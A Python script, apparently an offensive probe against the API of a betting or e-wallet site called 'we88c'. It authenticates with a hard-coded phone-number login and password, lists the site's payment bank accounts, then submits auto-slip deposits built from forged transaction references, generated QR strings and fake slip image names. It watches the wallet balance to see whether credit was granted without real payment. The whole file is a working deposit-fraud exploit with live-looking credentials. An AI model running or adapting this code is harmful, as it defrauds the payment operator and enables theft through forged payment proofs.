#!/usr/bin/env python3
"""probe_we88c_final.py — Get we88c bank accounts and deposit."""
import json, pathlib, requests, sys, time

sys.path.insert(0, "nuxt")
from slipgen3 import generate_tx_reference, generate_qr_data
from datetime import datetime, timezone, timedelta

TID    = "54ef7626cb381f4bab8be91f0cdbce47"
PBAPI  = f"https://{TID}pbapi.asdgapicenterssdo.com"
MGAPI  = f"https://{TID}mgapi.asdgapicenterssdo.com"

r = requests.post(f"{PBAPI}/pb/authentication",
    headers={"Content-Type": "application/json", "template": "vn"},
    json={"strategy": "local", "username": "0972571110", "password": "Pwned2026!"},
    timeout=15)
JWT = r.json()["accessToken"]
HDR = {"Authorization": f"Bearer {JWT}", "template": "vn", "Content-Type": "application/json"}

def wallet():
    r = requests.get(f"{MGAPI}/mb/wallet", headers=HDR, timeout=10)
    return r.json().get("data", [{}])[0].get("balance", "?") if r.ok else f"ERR:{r.status_code}"

print(f"wallet: {wallet()}\n")

# Get bank accounts
print("=== Get we88c payment bank accounts ===")
r = requests.get(f"{MGAPI}/mb/payment-bank-information", headers=HDR, timeout=10)
print(f"HTTP {r.status_code}")
print(f"Raw response: {r.text[:1000]}")

bank_ids = []
if r.ok:
    try:
        data = r.json()
        # Parse the response structure
        if isinstance(data, dict):
            items = data.get("data", [])
            if isinstance(items, dict):
                # Single item
                items = [items]
            elif isinstance(items, list):
                pass
            else:
                # data might be the bank info itself
                items = [data]
        elif isinstance(data, list):
            items = data
        else:
            items = []

        print(f"\n{len(items)} bank accounts:")
        for item in items:
            if isinstance(item, dict):
                bid = item.get("id") or item.get("payment_bank_information_id") or "?"
                bno = item.get("bank_account_no") or item.get("bank_no") or item.get("account_no") or ""
                btype = item.get("payment_type_code") or item.get("bank_code") or "?"
                bname = item.get("payment_name") or item.get("name") or "?"
                active = item.get("is_active", item.get("status", "?"))
                if bid and bid != "?":
                    bank_ids.append(bid)
                print(f"  {str(bid)[:12]:12} | {str(btype):15} | {str(bname)[:20]:20} | bank_no={bno}")
    except Exception as e:
        print(f"Parse error: {e}")

# If no bank IDs found, try to extract from raw JSON
if not bank_ids:
    import re
    # Find all UUIDs in response
    uuids = re.findall(r'[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}', r.text)
    bank_ids = list(set(uuids))[:5]
    print(f"\nExtracted UUIDs: {bank_ids}")

# Try deposit with each bank ID
print(f"\n=== Try deposit with {len(bank_ids)} bank IDs ===")
for bid in bank_ids:
    now = datetime.now(timezone.utc) + timedelta(hours=7, seconds=bank_ids.index(bid)*2)
    tx = generate_tx_reference(now)
    qr = generate_qr_data(tx)

    r = requests.post(f"{MGAPI}/mb/auto-slip-deposit", headers=HDR,
                      json={"payment_bank_information_id": bid,
                            "deposit_amount": 100,
                            "note": "$",
                            "slip_image_url": f"slip_{tx[:8]}.jpg",
                            "qr_string": qr},
                      timeout=15)
    msg = ""
    if r.status_code == 500:
        try:
            msg = r.json().get("message", {}).get("en", "")[:50]
        except Exception:
            msg = r.text[:50]
    print(f"  {bid[:8]}: HTTP {r.status_code} {msg}")
    if r.ok:
        print(f"    [!!!] SUCCESS! wallet: {wallet()}")
        break
    time.sleep(0.3)

print(f"\nFINAL wallet: {wallet()}")
